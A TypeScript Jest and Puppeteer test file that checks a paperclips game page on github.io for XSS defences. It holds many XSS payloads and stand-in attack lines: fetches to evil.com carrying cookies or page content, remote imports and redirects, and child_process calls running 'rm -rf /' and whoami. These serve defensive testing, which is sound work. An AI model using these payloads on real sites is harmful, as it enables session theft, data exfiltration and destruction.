import { describe, it, expect, beforeAll, afterAll } from '@jest/globals';
import puppeteer, { Browser, Page } from 'puppeteer';

describe('XSS Prevention Tests', () => {
  let browser: Browser;
  let page: Page;

  beforeAll(async () => {
    browser = await puppeteer.launch({ headless: true });
    page = await browser.newPage();
  });

  afterAll(async () => {
    await browser.close();
  });

  describe('URL Parameter XSS Tests', () => {
    it('should prevent XSS through URL parameters', async () => {
      const xssPayloads = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'file:///etc/passwd',
        'chrome://settings',
        '<script>alert("xss")</script>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '\'-alert(1)-\'',
        '\'><script>alert(String.fromCharCode(88,83,83))</script>',
        '"><img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<iframe src=javascript:alert(1)>',
        '<object data=javascript:alert(1)>',
        '<embed src=javascript:alert(1)>',
        '<form action=javascript:alert(1)><input type=submit>',
        '<input type="image" src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<keygen autofocus onfocus=alert(1)>',
        '<textarea autofocus onfocus=alert(1)>',
        '<select autofocus onfocus=alert(1)>',
        '<button form=test onformchange=alert(1)>',
        '<output form=test onformchange=alert(1)>',
        '<fieldset form=test onformchange=alert(1)>',
        '<math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>',
        '<math><mtext></form><form><mglyph><svg><script>alert(1)</script>',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
        '\\74script\\76alert(1)\\74/script\\76',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%253Cscript%253Ealert(1)%253C/script%253E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;'
      ];

      for (const payload of xssPayloads) {
        try {
          // Test navigation with XSS payload
          const response = await page.goto(`https://williamzujkowski.github.io/paperclips/index2.html?param=${encodeURIComponent(payload)}`, {
            waitUntil: 'networkidle0',
            timeout: 5000
          });

          // Check if page loaded without executing XSS
          expect(response?.status()).toBe(200);

          // Check for alert dialogs
          const alertFired = await new Promise(resolve => {
            page.once('dialog', () => resolve(true));
            setTimeout(() => resolve(false), 1000);
          });

          expect(alertFired).toBe(false);

          // Check page content doesn't contain unescaped payload
          const content = await page.content();
          expect(content).not.toContain('<script>alert');
          expect(content).not.toContain('javascript:alert');
          expect(content).not.toContain('onerror=alert');
          expect(content).not.toContain('onload=alert');
        } catch (error: any) {
          // Some payloads might cause navigation errors, which is expected
          expect(error.message).toMatch(/Navigation|Protocol|Invalid URL/);
        }
      }
    });

    it('should sanitize script injection in selectors', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const maliciousSelectors = [
        '"><script>alert(1)</script>',
        '\' or \'1\'=\'1',
        '`; alert(1); //`',
        '${alert(1)}',
        '{{constructor.constructor(\'alert(1)\')()}}',
        'img[src=x onerror=alert(1)]',
        '*[onclick="alert(1)"]',
        'a[href="javascript:alert(1)"]'
      ];

      for (const selector of maliciousSelectors) {
        try {
          // Attempt to use malicious selector
          const elements = await page.$$(selector);
          
          // If selector is processed, it should return empty or throw error
          expect(elements.length).toBe(0);
        } catch (error) {
          // Invalid selectors should throw errors
          expect(error).toBeDefined();
        }
      }
    });

    it('should prevent script execution through evaluate', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const dangerousScripts = [
        'window.location = "http://evil.com"',
        'document.cookie = "stolen=" + document.cookie',
        'fetch("http://evil.com/steal?data=" + document.body.innerHTML)',
        'require("child_process").exec("rm -rf /")',
        'process.exit()',
        'global.process.mainModule.require("child_process").exec("whoami")',
        'this.constructor.constructor("return process")().exit()',
        'eval("alert(1)")',
        'Function("alert(1)")()',
        'setTimeout("alert(1)", 0)',
        'setInterval("alert(1)", 1000)',
        'new Function("alert(1)")()'
      ];

      for (const script of dangerousScripts) {
        try {
          // Scripts should be executed in a sandboxed context
          const result = await page.evaluate(script);
          
          // Check that dangerous operations didn't succeed
          const url = await page.url();
          expect(url).toContain('williamzujkowski.github.io');
          
          // Check cookies weren't modified
          const cookies = await page.cookies();
          expect(cookies).not.toContainEqual(expect.objectContaining({ name: 'stolen' }));
        } catch (error) {
          // Some scripts should throw errors, which is expected
          expect(error).toBeDefined();
        }
      }
    });

    it('should sanitize HTML injection', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const htmlPayloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<script>alert(1)</script>',
        '<link rel="import" href="http://evil.com/xss.html">',
        '<meta http-equiv="refresh" content="0; url=http://evil.com">',
        '<base href="http://evil.com/">',
        '<form action="http://evil.com"><input name="data" value="stolen"></form>',
        '<!--[if IE]><script>alert(1)</script><![endif]-->',
        '<style>@import "http://evil.com/xss.css";</style>',
        '<style>body{background:url("javascript:alert(1)")}</style>'
      ];

      for (const payload of htmlPayloads) {
        // Test setting innerHTML
        await page.evaluate((html) => {
          const div = document.createElement('div');
          div.innerHTML = html;
          document.body.appendChild(div);
        }, payload);

        // Check for alert dialogs
        const alertFired = await new Promise(resolve => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 500);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate(() => {
          document.body.lastElementChild?.remove();
        });
      }
    });

    it('should prevent DOM-based XSS', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const domXSSTests = [
        // Test location.hash manipulation
        async () => {
          await page.evaluate(() => {
            window.location.hash = '<img src=x onerror=alert(1)>';
          });
          const hash = await page.evaluate(() => window.location.hash);
          expect(hash).toBe('#%3Cimg%20src=x%20onerror=alert(1)%3E');
        },
        // Test document.write
        async () => {
          const writeBlocked = await page.evaluate(() => {
            try {
              document.write('<script>alert(1)</script>');
              return false;
            } catch {
              return true;
            }
          });
          expect(writeBlocked).toBe(true);
        },
        // Test innerHTML on various elements
        async () => {
          const elements = ['div', 'span', 'p', 'h1', 'td', 'li'];
          for (const tag of elements) {
            await page.evaluate((tagName) => {
              const el = document.createElement(tagName);
              el.innerHTML = '<img src=x onerror=alert(1)>';
              document.body.appendChild(el);
            }, tag);

            const alertFired = await new Promise(resolve => {
              page.once('dialog', () => resolve(true));
              setTimeout(() => resolve(false), 100);
            });

            expect(alertFired).toBe(false);
          }
        }
      ];

      for (const test of domXSSTests) {
        await test();
      }
    });

    it('should prevent stored XSS through localStorage', async () => {
      await page.goto('https://williamzujkowski.github.io/paperclips/index2.html');

      const xssPayloads = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        '<svg onload=alert(1)>'
      ];

      for (const payload of xssPayloads) {
        // Store XSS payload
        await page.evaluate((xss) => {
          localStorage.setItem('xssTest', xss);
        }, payload);

        // Reload page to test stored XSS
        await page.reload();

        // Check if stored payload gets executed
        const alertFired = await new Promise(resolve => {
          page.once('dialog', () => resolve(true));
          setTimeout(() => resolve(false), 1000);
        });

        expect(alertFired).toBe(false);

        // Clean up
        await page.evaluate(() => {
          localStorage.removeItem('xssTest');
        });
      }
    });
  });
});